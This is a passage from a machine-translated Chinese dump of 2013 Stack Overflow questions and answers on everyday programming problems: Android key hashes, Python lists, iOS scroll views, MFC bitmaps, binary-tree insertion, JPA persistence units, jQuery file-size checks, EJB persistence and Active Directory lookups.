> 赞同：2
> 
> 时间：2013-04-26T13:12:58.673

大家好，我想与您分享此信息，以解决任何面临上述问题的人。

有时当您开发 facebook 应用程序时，您需要通过 keytool 生成哈希密钥“您可以通过此命令生成它 keytool -exportcert -alias androiddebugkey -keystore C:\Users\YOURUSER.android\debug.keystore | "C:\ bin\bin\openssl" sha1 -binary |"C:\bin\bin\openssl" base64 输入 android 作为密码"。

上述方法中的问题有时会生成错误的哈希键，因为它取决于 JDK 版本并使用了 openssl 应用程序，因此您的 facebook 应用程序无法登录。

问题解决了，您可以在活动中编写下面的代码，并使用生成的哈希键代替上面的一个，一切都会正常工作。

```
 try {
        PackageInfo info = getPackageManager().getPackageInfo(
                "com.kartag.gui", 
                PackageManager.GET_SIGNATURES);
        for (Signature signature : info.signatures) {
            MessageDigest md = MessageDigest.getInstance("SHA");
            md.update(signature.toByteArray());
            Log.d("KeyHash:", Base64.encodeToString(md.digest(), Base64.DEFAULT));
            }
    } catch (NameNotFoundException e) {

    } catch (NoSuchAlgorithmException e) {

    } 
```

# python - 从python中的列表中删除对象实例

> ID：16204549
> 
> 赞同：0
> 
> 时间：2013-04-25T00:36:32.437
> 
> 标签：python, list, object, python-2.7, del

我有这个电梯任务，我被困在一个地方。我有一个包含客户列表的建筑对象。我正在尝试一种让客户进入电梯的方法 - 客户被附加到电梯列表中，但无法找到从建筑物列表中删除该客户的方法：尝试过`del`但`list.remove(item)`没有任何乐趣。谁能指出我正确的方向？

```
class building(object):  
    def __init__(self, floors = 0, customerNo = 0,):
        self.floors = 0
        self.myE = elevator()
        self.customerNo = 0
        self.customersWaiting = []
        self.customersTransported = []

    def initCustomers(self):        
        cnt = 1
        cust = cnt
        while cnt <= myB.customerNo :
            floor = random.randint(0, self.floors - 1)
            destination = random.randint(0, self.floors - 1)
            cust = customer(cnt, floor , destination )
            self.customersWaiting.append(cust)
            cnt +=1

class customer(object):
    def __init__(self,cnt, floor = 0, destination = 0):
        self.cnt = cnt
        self.floor = floor
        self.destination = destination

    def enterElevator(self):
        for cust in myB.customersWaiting :
            if myB.myE.lvl == self.floor :
                myB.myE.customersIn.append(self)
                #del cust(self)
                #myB.customersWaiting.remove(self)
            else:
                pass 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-25T00:56:49.397

您好，这是我的一些建议：

1）建筑物应该有N层，你可以有一个buildingFactory来创建n层的建筑物。

```
def createBuilding(self, N):
    return building = Building(N)
class Building:
    def __init__(self, N):
        self.floorWatingList= []
        for f in range(N):
            self.floorWaitingList.append() = [] 
```

2) 使用 clear() 或 pop() 方法从列表中删除客户

```
for c in building.floorWaitingList[current]:
      elvator.enter(c)
building.floorWaitingList.clear() 
```

# ios - 小于边界时移动 UIScrollView 的子视图

> ID：16204550
> 
> 赞同：0
> 
> 时间：2013-04-25T00:36:38.183
> 
> 标签：ios, cocoa-touch, uiscrollview, uiimageview

在您设备上的常规照片应用程序中，如果您一直放大，则无法上下拖动图像。这是因为上面什么都没有，所以完全缩小时真的没有理由拖动。但是，在我的应用程序中，我希望它能够工作。它有点像裁剪工具，所以我希望用户能够一直放大，然后再放大一些，并且仍然能够将小图像移动到屏幕上的任何位置，但最好不要超出范围在你看不到的地方。

我之前通过将 imageView 作为子视图添加到比 imageView 大 3 倍的不可见视图中解决了这个问题，然后将此 invisiView 添加到 scrollView，但是，事实证明这很难通过裁剪处理。无论如何，我想知道是否有办法将 imageView 作为 scrollView 的唯一子视图。

我希望用户能够缩小，并像这样**移动**图像，所以它留在那里：

```
 -----------------
|     ----        |
|    |    |       |
|    |    |       |
|     ----        |
|      ^imageView |
|                 |
|                 | <-- scrollView
|                 |
|                 |
|    *nothing*    |
|                 |
 ----------------- 
```

缩放部分并不是真正的问题，只是将 minimumZoomScale 调整为 0.1 或其他什么，但每当图像小于屏幕时，整个图像周围的 IE 黑色边框都是虚无的，现在无法**移动**图像。最初，它卡在左上角，但我找到了一种将其居中的方法，但我仍然希望能够移动它。

任何人？

# c++ - 骰子的位图

> ID：16204552
> 
> 赞同：0
> 
> 时间：2013-04-25T00:36:44.430
> 
> 标签：c++, visual-studio-2012, mfc, bitmap

您将如何掷骰子并显示相应的骰子面位图

一些快速有效的代码示例？

```
void CMFCApplication12Dlg::OnBnClickedDiceroll()

    {  
       int die1 = 1 + rand() % 6; // first die roll
       int die2 = 1 + rand() % 6; // second die roll
       //display die1 & die2
    } 
```

// 无效 CMFCApplication12Dlg:: OnPaint 处理程序 ()

```
{
//load the image file
    CString szFilename("C:\\Talla\\yourimg.bmp");
    HBITMAP hBmp = (HBITMAP)::LoadImage(NULL,szFilename,
    IMAGE_BITMAP,0,0,
    LR_LOADFROMFILE|LR_CREATEDIBSECTION);

//Create a Bitmap Object and Attach It to the Object
    CBitmap bmp;
    bmp.Attach(hBmp);

// Create a Memory DC and Select the BMP to It
    CClientDC dc(this);
    CDC bmDC;
    bmDC.CreateCompatibleDC(&dc);
    CBitmap *pOldbmp = bmDC.SelectObject(&bmp);

//Get the BMP Height and Width 
    BITMAP bi;
    bmp.GetBitmap(&bi);

//Get the Block of Pixels from memoryDC to the Screen

    dc.BitBlt(0,0,bi.bmWidth,bi.bmHeight,&bmDC,0,0,SRCCOPY);
    bmDC.SelectObject(pOldbmp);
    } 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-25T00:58:44.820

使窗口无效，[`InvalidateRect`](http://msdn.microsoft.com/en-us/library/windows/desktop/dd145002%28v=vs.85%29.aspx)以便它重新绘制自己。在`WM_PAINT`处理程序中，您需要将模具编号转换为资源 ID。然后你从资源中加载位图`LoadImage`。创建一个内存 DC 并将位图选择到其中，然后使用`BitBlt`将其复制到窗口中。

# java - 将元素添加到二叉树中的第一个未占用的叶子

> ID：16204556
> 
> 赞同：0
> 
> 时间：2013-04-25T00:37:23.473
> 
> 标签：java, heap, binary-tree, breadth-first-search, binary-heap

现在我正在尝试用 Java 编写一个通过二叉树结构实现的二叉堆，虽然我对如何在添加元素后“堆化”树有很好的了解，但找到第一个未占用叶子的逻辑在堆的底部躲避我。

我知道找到第一个未占用的叶子应该是广度优先遍历，但我仍然无法弄清楚广度优先遍历算法究竟是如何工作的。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-25T00:48:23.507

这就是对第一个空分支（随后插入分支）进行广度优先搜索的样子。请注意，这与深度优先插入基本相同，只是它使用队列，而深度优先插入使用堆栈。

```
void breadthFirstInsert(Node root, Object obj) {
    Queue<Node> queue = new LinkedList<>();
    queue.offer(root);
    while(!queue.isEmpty()) {
        Node temp = queue.poll();
        if(temp.left != null) {
            queue.offer(temp.left);
        } else {
            temp.left = new Node(obj);
            return;
        }
        if(temp.right != null) {
            queue.offer(temp.right);
        } else {
            temp.right = new Node(obj);
            return;
        }
    }
} 
```

# android - Android：Xamarin JNI 绑定——抽象类继承

> ID：16204559
> 
> 赞同：5
> 
> 时间：2013-04-25T00:38:06.820
> 
> 标签：android, java-native-interface, xamarin

在尝试与开源图形项目（[https://github.com/pardom/AndroidUtils](https://github.com/pardom/AndroidUtils)）绑定时，我遇到了 Xamarin JNI 绑定的障碍

该项目具有以下抽象类：

```
public static abstract class AbstractPoint implements Comparable<AbstractPoint> {
  ....
  @Override
    public int compareTo(AbstractPoint another) {
        return Double.compare(mX, another.mX);
    }
} 
```

继承AbstractPoint的静态类(LinearPoint)没有实现上面的compareTo()方法

我收到以下绑定错误：

'Com.Michaelpardo.Android.Widget.Chartview.LinearSeries.LinearPoint' 没有实现继承的抽象成员 'Com.Michaelpardo.Android.Widget.Chartview.AbstractSeries.AbstractPoint.CompareTo(Java.Lang.Object)'

任何人都可以建议吗？

谢谢

# validation - 如何记录 Grails 命令对象错误？

> ID：16204563
> 
> 赞同：2
> 
> 时间：2013-04-25T00:39:05.557
> 
> 标签：validation, grails, logging

在 Grails 中记录带有错误的命令对象的最有效方法是什么？

我目前的记录只是，

```
if (!cmd.validate()) log.debug("command invalid ${cmd.errors}") 
```

但它只是吐出一团难以理解的输出。

有人对改进命令对象的日志记录有任何建议吗？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2013-04-25T02:18:10.823

`messageSource`为bean添加依赖注入：

```
def messageSource 
```

然后您可以构建一个以字段名称为键的映射，其中包含该字段的验证错误：

```
def locale = Locale.default
def stringsByField = [:].withDefault { [] }
for (fieldErrors in cmd.errors) {
   for (error in fieldErrors.allErrors) {
      stringsByField[error.field] << messageSource.getMessage(error, locale)
   }
} 
```

您可以`println stringsByField`通过按键运行或查找个别问题。

在这里，我使用默认区域设置，但如果您使用本地化，请使用当前的本地化请求。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2013-04-25T01:49:13.390

```
cmd.errors.allErrors.each {
    log.debug it
} 
```

**编辑**（更详细）

```
cmd.errors.allErrors.each {err ->
    log.debug("[$err.field]: $err")
} 
```

# database - JPA 实体 - 指定持久性单元？

> ID：16204565
> 
> 赞同：11
> 
> 时间：2013-04-25T00:39:17.313
> 
> 标签：database, jakarta-ee, jpa, jpa-2.0, persistence-unit

我有一个使用多个持久性单元的 JavaEE 项目。有没有办法指定特定 JPA 实体属于哪个持久性单元？一些实体在一个数据源中，而其他实体在我的第二个数据源中。有没有办法使用注释来区分两者？

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2013-04-25T02:13:38.610

要指定`Entity`属于哪个持久单元，请使用以下`persistence.xml`文件：

```
<persistence version="2.0" xmlns="http://java.sun.com/xml/ns/persistence" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://java.sun.com/xml/ns/persistence http://java.sun.com/xml/ns/persistence/persistence_2_0.xsd">

    <persistence-unit name="user" transaction-type="JTA">
        <provider>org.eclipse.persistence.jpa.PersistenceProvider</provider>
        <jta-data-source>jdbc/myApp</jta-data-source>
        <class>com.company.User</class>
        <exclude-unlisted-classes>true</exclude-unlisted-classes>
        <properties>
            <!-- properties -->
        </properties>
    </persistence-unit>

    <persistence-unit name="data" transaction-type="JTA">
        <provider>org.eclipse.persistence.jpa.PersistenceProvider</provider>
        <jta-data-source>jdbc/myApp_data</jta-data-source>
        <!--<mapping-file>META-INF/myApp_entities.xml</mapping-file> You can also use mapping files.-->
        <class>com.company.Data</class>
        <exclude-unlisted-classes>true</exclude-unlisted-classes>
        <properties>
            <!-- properties -->
        </properties>
    </persistence-unit>
</persistence> 
```

注意使用`<exclude-unlisted-classes />`.

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2015-07-31T16:30:13.710

应该也可以使用（虽然`@PersistenceUnit`我还没有尝试过）

例如

```
@PersistenceUnit(unitName="persistenceUnit2")
@Entity
class XPTO {
} 
```

来自 Javadoc ( [http://docs.oracle.com/javaee/6/api/javax/persistence/PersistenceUnit.html](http://docs.oracle.com/javaee/6/api/javax/persistence/PersistenceUnit.html) )

> “表示对 EntityManagerFactory 及其关联的持久性单元的依赖。”
> 
> unitName （可选）persistence.xml 文件中定义的持久性单元的名称。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-04-25T22:20:45.507

您还可以通过识别注册实体的 EntityManager 来识别实体属于哪个持久单元。

一个托管实体属于一个持久化上下文，一个持久化上下文属于一个持久化单元。所以在这个例子中：

```
@PersistenceContext(unitName="persistence-unit-1")
EntityManager em1;

@PersistenceContext(unitName="persistence-unit-2")
EntityManager em2;

em1.persist(entity1);
em2.persist(entity2); 
```

entity1 属于 persistence-unit-1，entity2 属于 persistence-unit-2。它不像在 persistence.xml 中指定 <class> 标记那样明确，但是您可以在两个持久单元中拥有相同的实体类，并且仍然可以区分每个实体实例属于哪个单元。

# jquery - 如何禁止将大文件添加到文件输入

> ID：16204567
> 
> 赞同：2
> 
> 时间：2013-04-25T00:39:26.980
> 
> 标签：jquery

我有输入文件

```
<input class="input-file" type=file/> 
```

我使用以下函数来检查文件大小

```
 $(".input-file[type=file]").change(function () {
        var file = this.files[0];
        if (file.size > 2*1024*1024) {
            alert("Too large Image. Only image smaller than 2MB can be uploaded.");
            return false;
        }
        $(".input-file[type=file]").submit();
    }); 
```

问题是即使用户收到警告消息“太大的图像。只能上传小于 2MB 的图像。”，但最终将 MyBigFile.txt 添加到输入文件中。如何不让用户将大于 2MB 的文件添加到文件输入中？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-04-25T00:45:35.973

您可以用一个全新的输入替换有问题的输入，因为您不能对文件输入做太多事情。

```
$(document).on("change", ".input-file[type=file]", function () {
    var file = this.files[0];
    if (file.size > 2*1024*1024) {
        alert("Too large Image. Only image smaller than 2MB can be uploaded.");
        $(this).replaceWith('<input class="input-file" type="file">');
        return false;
    }
}); 
```

[http://jsfiddle.net/EuAy8/2/](http://jsfiddle.net/EuAy8/2/)

# java - 数据未插入数据库，但未出现任何异常

> ID：16204568
> 
> 赞同：0
> 
> 时间：2013-04-25T00:39:32.877
> 
> 标签：java, hibernate, jpa, ejb

我正在开发 ejb + JPA (Hibernate) 应用程序。当我将数据插入数据库时​​，它没有被插入。但是 sessionbean 不会抛出任何错误。

下面是代码。

```
@PersistenceContext private EntityManager em;

    @Override
    public void insterCustomerDetails(Customer customer) {
        // TODO Auto-generated method stub
        try{
            System.out.println("properties:::"+em.getProperties());
            System.out.println("Model :::"+em.getMetamodel());
        System.out.println("Name ::::" + customer.getName() + "::customer id ::"+customer.getCustomer_id()+"::email::"+customer.getEmail_id()+"::address::"+customer.getAddress()+
                ":::ph number::"+customer.getPhNumber());
        em.persist(customer);
        }catch(Exception e){
        e.printStackTrace();
    }
    } 
```

**豆类**

```
package retail.model.vo;

import java.io.Serializable;

import javax.persistence.Column;
import javax.persistence.Entity;
import javax.persistence.GeneratedValue;
import javax.persistence.GenerationType;
import javax.persistence.Id;
import javax.persistence.Table;

@Entity
@Table(name = "CUSTOMER")
public class Customer  implements Serializable{

    /**
     * 
     */
    private static final long serialVersionUID = 5256938732963606407L;
    private int customer_id;
    private String name;
    private String address;
    private String email_id;
    private int phNumber;

    @Id
    @GeneratedValue(strategy = GenerationType.IDENTITY)
    @Column(name = "customer_id")
    public int getCustomer_id() {
        return customer_id;
    }

    public void setCustomer_id(int customer_id) {
        this.customer_id = customer_id;
    }

    @Column(name = "Name")
    public String getName() {
        return name;
    }

    public void setName(String name) {
        this.name = name;
    }

    @Column(name = "addres")
    public String getAddress() {
        return address;
    }

    public void setAddress(String address) {
        this.address = address;
    }

    @Column(name = "email_add")
    public String getEmail_id() {
        return email_id;
    }

    public void setEmail_id(String email_id) {
        this.email_id = email_id;
    }

    @Column(name = "ph_number")
    public int getPhNumber() {
        return phNumber;
    }

    public void setPhNumber(int phNumber) {
        this.phNumber = phNumber;
    }

     public String validate(){
          if(name!=null && name!=""){
          System.out.println("chandan");
          return "viewCustomerDetails";
          }
          else{
          return "viewCustomerDetails";
          }
          }
} 
```

**托管豆**

```
public String createCustomer() throws NamingException{
    try{
    System.out.println("in Create customer method +++++++++++++++++++++++");
    Properties p = new Properties();
    //p.put("java.naming.factory.initial","com.sun.jndi.cosnaming.CNCtxFactory");
    p.setProperty("java.naming.factory.initial", "com.sun.enterprise.naming.impl.SerialInitContextFactory");
    p.setProperty("java.naming.factory.url.pkgs", "com.sun.enterprise.naming");
    p.setProperty("java.naming.factory.state", "com.sun.corba.ee.impl.presentation.rmi.JNDIStateFactoryImpl");
    p.setProperty("org.omg.CORBA.ORBInitialHost", "localhost");
    p.setProperty("org.omg.CORBA.ORBInitialPort", "3700"); //any configured port different from 3700 - 34513
    InitialContext c = new InitialContext(p);
    System.out.println("in Create customer method remote+++++++++++++++++++++++");
    CustomerSessionBeanRemote remote = (CustomerSessionBeanRemote) c.lookup("java:global/RetailProducts/CustomerSessionBeanImpl!retail.ejb.service.CustomerSessionBeanRemote");
                                                                            //java:global/RetailService/CustomerSessionBeanImpl!retail.ejb.service.CustomerSessionBeanRemote
     //java:global/RetailProducts/CustomerSessionBeanImpl!retail.ejb.service.CustomerSessionBeanRemote
    System.out.println("in Create customer method remote222+++++++++++++++++++++++");
    remote.insterCustomerDetails(getCustomer());
    remote.showCustDetails();
    }catch(Exception e){
        e.printStackTrace();
    }
    //System.exit(1);
    return "viewCustomerDetails";
} 
```

**持久性.xml**

```
<?xml version="1.0" encoding="UTF-8"?>
<persistence xmlns="http://java.sun.com/xml/ns/persistence"
    xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
    xsi:schemaLocation="http://java.sun.com/xml/ns/persistence http://java.sun.com/xml/ns/persistence/persistence_1_0.xsd"
    version="1.0">

    <persistence-unit name="RetailUnit" >
        <provider>org.hibernate.ejb.HibernatePersistence</provider>
        <!-- the JNDI data source-->
        <jta-data-source>java/customer</jta-data-source>
        <properties> 
            <!-- if this is true, hibernate will print (to stdout) the SQL it executes, 
                so you can check it to ensure it's not doing anything crazy
                 <property name="hibernate.connection.driver_class" value="org.apache.derby.jdbc.ClientDriver"/>
                 <property name="hibernate.connection.url" value="jdbc:derby://localhost:1527/company;create=true" />
              <property name="hibernate.connection.username" value="user" />
              <property name="hibernate.connection.password" value="123" /> -->
            <property name="hibernate.show_sql" value="true" />
            <property name="hibernate.format_sql" value="true" />
            <!-- since most database servers have slightly different versions of the 
                SQL, Hibernate needs you to choose a dialect so it knows the subtleties of 
                talking to that server -->
            <property name="hibernate.dialect" value="org.hibernate.dialect.DerbyDialect" />
            <property name="hibernate.archive.autodetection" value="class"/>
            <!-- this tell Hibernate to update the DDL when it starts, very useful 
                for development, dangerous in production -->
            <property name="hibernate.hbm2ddl.auto" value="create" />
        </properties>
    </persistence-unit>
</persistence> 
```

这是控制台输出：

```
INFO: Name ::::sdasdas::customer id ::0::email::sdasdasd::address::asdasdasd:::ph number::2323234
INFO: Hibernate: 
    insert 
    into
        CUSTOMER
        (customer_id, addres, email_add, Name, ph_number) 
    values
        (default, ?, ?, ?, ?)
INFO: Hibernate: 

values
    identity_val_local() 
```

我使用 derby 数据库工具的命令行检查了数据库是否正在插入。客户表中没有行。

## 更新

现在得到异常：

```
SEVERE: java.lang.IllegalStateException: A JTA EntityManager cannot use getTransaction()
    at org.hibernate.ejb.AbstractEntityManagerImpl.getTransaction(AbstractEntityManagerImpl.java:985)
    at com.sun.enterprise.container.common.impl.EntityManagerWrapper.getTransaction(EntityManagerWrapper.java:857)
    at retail.ejb.service.CustomerSessionBeanImpl.insterCustomerDetails(CustomerSessionBeanImpl.java:24)
    at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
    at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:57)
    at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
    at java.lang.reflect.Method.invoke(Method.java:601)
    at org.glassfish.ejb.security.application.EJBSecurityManager.runMethod(EJBSecurityManager.java:1052)
    at org.glassfish.ejb.security.application.EJBSecurityManager.invoke(EJBSecurityManager.java:1124)
    at com.sun.ejb.containers.BaseContainer.invokeBeanMethod(BaseContainer.java:5388)
    at com.sun.ejb.EjbInvocation.invokeBeanMethod(EjbInvocation.java:619)
    at com.sun.ejb.containers.interceptors.AroundInvokeChainImpl.invokeNext(InterceptorManager.java:800)
    at com.sun.ejb.EjbInvocation.proceed(EjbInvocation.java:571)
    at com.sun.ejb.containers.interceptors.SystemInterceptorProxy.doAround(SystemInterceptorProxy.java:162)
    at com.sun.ejb.containers.interceptors.SystemInterceptorProxy.aroundInvoke(SystemInterceptorProxy.java:144)
    at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
    at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:57)
    at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
    at java.lang.reflect.Method.invoke(Method.java:601)
    at com.sun.ejb.containers.interceptors.AroundInvokeInterceptor.intercept(InterceptorManager.java:861)
    at com.sun.ejb.containers.interceptors.AroundInvokeChainImpl.invokeNext(InterceptorManager.java:800)
    at com.sun.ejb.containers.interceptors.InterceptorManager.intercept(InterceptorManager.java:370)
    at com.sun.ejb.containers.BaseContainer.__intercept(BaseContainer.java:5360)
    at com.sun.ejb.containers.BaseContainer.intercept(BaseContainer.java:5348)
    at com.sun.ejb.containers.EJBObjectInvocationHandler.invoke(EJBObjectInvocationHandler.java:206)
    at com.sun.ejb.containers.EJBObjectInvocationHandlerDelegate.invoke(EJBObjectInvocationHandlerDelegate.java:79)
    at $Proxy255.insterCustomerDetails(Unknown Source)
    at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
    at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:57)
    at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
    at java.lang.reflect.Method.invoke(Method.java:601)
    at com.sun.corba.ee.impl.presentation.rmi.StubInvocationHandlerImpl.privateInvoke(StubInvocationHandlerImpl.java:241)
    at com.sun.corba.ee.impl.presentation.rmi.StubInvocationHandlerImpl.invoke(StubInvocationHandlerImpl.java:152)
    at com.sun.corba.ee.impl.presentation.rmi.codegen.CodegenStubBase.invoke(CodegenStubBase.java:227)
    at retail.ejb.service.__CustomerSessionBeanRemote_Remote_DynamicStub.insterCustomerDetails(retail/ejb/service/__CustomerSessionBeanRemote_Remote_DynamicStub.java)
    at retail.ejb.service._CustomerSessionBeanRemote_Wrapper.insterCustomerDetails(retail/ejb/service/_CustomerSessionBeanRemote_Wrapper.java)
    at retail.web.mbean.CustomerMB.createCustomer(CustomerMB.java:58)
    at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
    at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:57)
    at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
    at java.lang.reflect.Method.invoke(Method.java:601)
    at com.sun.el.parser.AstValue.invoke(AstValue.java:254)
    at com.sun.el.MethodExpressionImpl.invoke(MethodExpressionImpl.java:302)
    at javax.faces.component.MethodBindingMethodExpressionAdapter.invoke(MethodBindingMethodExpressionAdapter.java:88)
    at com.sun.faces.application.ActionListenerImpl.processAction(ActionListenerImpl.java:102)
    at javax.faces.component.UICommand.broadcast(UICommand.java:315)
    at javax.faces.component.UIViewRoot.broadcastEvents(UIViewRoot.java:794)
    at javax.faces.component.UIViewRoot.processApplication(UIViewRoot.java:1259)
    at com.sun.faces.lifecycle.InvokeApplicationPhase.execute(InvokeApplicationPhase.java:81)
    at com.sun.faces.lifecycle.Phase.doPhase(Phase.java:101)
    at com.sun.faces.lifecycle.LifecycleImpl.execute(LifecycleImpl.java:118)
    at javax.faces.webapp.FacesServlet.service(FacesServlet.java:593)
    at org.apache.catalina.core.StandardWrapper.service(StandardWrapper.java:1550)
    at org.apache.catalina.core.StandardWrapperValve.invoke(StandardWrapperValve.java:281)
    at org.apache.catalina.core.StandardContextValve.invoke(StandardContextValve.java:175)
    at org.apache.catalina.core.StandardPipeline.doInvoke(StandardPipeline.java:655)
    at org.apache.catalina.core.StandardPipeline.invoke(StandardPipeline.java:595)
    at org.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java:161)
    at org.apache.catalina.connector.CoyoteAdapter.doService(CoyoteAdapter.java:331)
    at org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:231)
    at com.sun.enterprise.v3.services.impl.ContainerMapper$AdapterCallable.call(ContainerMapper.java:317)
    at com.sun.enterprise.v3.services.impl.ContainerMapper.service(ContainerMapper.java:195)
    at com.sun.grizzly.http.ProcessorTask.invokeAdapter(ProcessorTask.java:860)
    at com.sun.grizzly.http.ProcessorTask.doProcess(ProcessorTask.java:757)
    at com.sun.grizzly.http.ProcessorTask.process(ProcessorTask.java:1056)
    at com.sun.grizzly.http.DefaultProtocolFilter.execute(DefaultProtocolFilter.java:229)
    at com.sun.grizzly.DefaultProtocolChain.executeProtocolFilter(DefaultProtocolChain.java:137)
    at com.sun.grizzly.DefaultProtocolChain.execute(DefaultProtocolChain.java:104)
    at com.sun.grizzly.DefaultProtocolChain.execute(DefaultProtocolChain.java:90)
    at com.sun.grizzly.http.HttpProtocolChain.execute(HttpProtocolChain.java:79)
    at com.sun.grizzly.ProtocolChainContextTask.doCall(ProtocolChainContextTask.java:54)
    at com.sun.grizzly.SelectionKeyContextTask.call(SelectionKeyContextTask.java:59)
    at com.sun.grizzly.ContextTask.run(ContextTask.java:71)
    at com.sun.grizzly.util.AbstractThreadPool$Worker.doWork(AbstractThreadPool.java:532)
    at com.sun.grizzly.util.AbstractThreadPool$Worker.run(AbstractThreadPool.java:513)
    at java.lang.Thread.run(Thread.java:722) 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-25T17:06:30.337

您正在使用容器管理的持久性，因此您无法强制结束事务。

您想要执行的操作`em.flush()`。您还需要使用它的事务性注释您的 EJB 方法。所以放一个`@Requires`吧。

# vb.net - 当我只知道他们的电子邮件时，我可以查找用户的活动目录登录吗？

> ID：16204571
> 
> 赞同：1
> 
> 时间：2013-04-25T00:40:01.013
> 
> 标签：vb.net, active-directory

我对 AD 知之甚少，但这就是我正在尝试做的事情以及我听到的我应该去的方向。

我们在 Active Directory 中的用户在邮件字段中包含电子邮件地址。我想允许他们使用他们的电子邮件地址或他们的正常登录名登录到我们的网站。我的 VB 代码将检查他们是否输入了未格式化为电子邮件的文本并将其直接登录，或者是否将其格式化为电子邮件地址，我想使用该地址在后台查找登录信息。

我听说 DirectorySearcher 是要走的路，但我没有任何运气来实现它。我将不胜感激任何帮助。

```
Dim theUser As String = String.Empty
Dim strDomain As String = "DEV"
Dim directoryEntryMTA As String = "LDAP://dc=dev,dc=ad,dc=mtaaccount"

            If Not String.IsNullOrEmpty(txtUsername.Text) Then
                If txtUsername.Text.IndexOf("@") > -1 Then
                    Dim entry As New DirectoryEntry(directoryEntryMTA)
                    Dim search As New DirectorySearcher(entry)
                    search.Filter = "mail=" & txtUsername.Text
                    search.PropertiesToLoad.Add("SAMAccountName")
                    Dim result As SearchResult = search.FindOne()

                    If result IsNot Nothing Then
                        theUser = strDomain + "\" + result.ToString()
                    Else
                        ' ADD CODE IF DIRECTORY SEARCHER DOES NOT FIND ANY USER WITH SUPPLIED EMAIL
                    End If
                Else
                    theUser = strDomain + "\" + txtUsername.Text
                End If
            End If 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-07-11T22:13:25.927

不确定你是否曾经解决过这个问题，但试试这个：

```
If result IsNot Nothing Then
    '*** INSTEAD OF THIS ***
    'theUser = strDomain + "\" + result.ToString()

    '*** USE THIS ***
    theUser = strDomain + "\" + result.Properties("samaccountname").Item(0).ToString
Else
    ... 
```

调用对象`ToString`上的方法`result`将尝试将`SearchResult`对象转换为字符串，而不是`SAMAccountName`您刚刚在`search`对象中指定的属性。您需要实际识别您在`search`对象中定义的特定属性/属性和对象，并将它们的各个值转换为字符串（或整数，或日期时间等）

# architecture - 应用程序设计建议：通过 AWS 进行批量音频处理

> ID：16204588
> 
> 赞同：0
> 
> 时间：2013-04-25T00:41:41.630
> 
> 标签：architecture, amazon-web-services, batch-processing

我需要构建一个音频处理应用程序。高级工作流程是：

1.  用户上传一批音频文件
2.  文件由可执行文件处理
3.  用户能够下载处理后的文件。

我是一名 javascript 和 php 开发人员，但我并不精通架构和基础架构问题。我会想象 AWS 有一种产品或服务可以帮助完成很多繁重的工作，但我不确定我应该研究哪些 AWS 服务。

这是我的问题：AWS 是否提供针对此类应用程序量身定制的特定产品？如果有，是什么产品？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-25T02:05:19.267

简短的回答，不。您可以在 EC2 上托管您的应用程序，但其核心只是一个 VPS。您确实具有只为您需要的时间付费的优势。但是，如果您需要始终可用的应用程序，则至少需要运行一些实例。

如果您正在处理大批量的音频文件，您可以利用基础架构的弹性来优化成本。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-25T09:58:36.227

是和否：AWS 提供产品和服务来帮助解决您的问题 -*就像 Home Depot 提供解决您的住房问题的产品和服务一样*- 但您仍然需要拼凑出一个解决方案。

但是，例如，在您的场景中，这里只是 AWS 的一些产品以及您可能如何使用它们：

Amazon S3 可以在这些文件上传时和处理后存储这些文件。

Amazon Glacier 可用于在处理之前或之后对文件进行真正廉价的文件归档。

在或更多 EC2 实例上，运行您选择的操作系统风格可以托管实际处理文件的可执行文件。

Amazon SQS 和 SNS 可用于在系统的不同部分之间提供排队和通知服务，即构建要处理的文件队列，并允许多个工作作业从队列中读取文件并进行处理。

Amazon SES 可用于发送有关文件准备就绪的电子邮件通知。

# android - Android ListView SQL 分隔符

> ID：16204593
> 
> 赞同：0
> 
> 时间：2013-04-25T00:42:16.210
> 
> 标签：android, listview

我目前有一个从数据库运行查询并返回年份和月份的外部类。格式为：04/2003、04/2004 等。然后它将所有内容放入 List 并将其返回到主类，其中列表被分配给 ListViewer。所以我有两种列出所有内容的方法：用户点击列表中的月份，然后选择年份。或者我如何使它分开，当用户选择特定月份时，它会给出如下列表：

```
======2010======
Dec
Jan
March
etc..
======2011======
Dec
Jan
March
etc...
======2012======
Dec
Jan
March
etc.. 
```

那么基本上如何使 ListViewer 自动拆分或分离？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-25T02:24:05.690

您可以为此使用地图：

1.  创建一个 Map> 映射年份 -> 月份列表。
2.  在第一个列表视图中显示年份，在第二个列表视图中显示相应的月份。

# javascript - IE9 调试器 - 在“脚本”选项卡上，调试时“其他”部分的脚本是什么？

> ID：16204604
> 
> 赞同：5
> 
> 时间：2013-04-25T00:43:23.017
> 
> 标签：javascript, debugging, internet-explorer-9, javascript-debugger

